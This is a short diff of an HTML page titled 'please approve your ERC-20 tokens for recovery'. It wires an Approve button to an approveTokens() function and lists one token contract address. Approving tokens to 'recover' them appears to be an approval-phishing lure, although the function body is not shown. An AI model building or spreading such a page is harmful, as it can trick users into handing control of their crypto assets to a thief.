@@ -117,13 +117,13 @@ PLEASE APPROVE YOUR ERC-20 TOKENS FOR RECOVERY
 <br>
 
 <form action="" method="POST" name="myform">
-<select name="selectToken">
+<select name="selectToken" id="test_select">
  <option value="0x8540F8735c04f1930f3922A8CB84164edfBb0E59">LOTT => Lottoken</option>
 <option value="2">my val 2</option>
 <option value="3">my val 3</option>
 <option value="4">my val 4</option>
 </select>
-<input type="submit" value="Approve" name="test_button">
+<input type="button" value="Approve" name="test_button" onclick="approveTokens();">
 </form>
  
 <script>
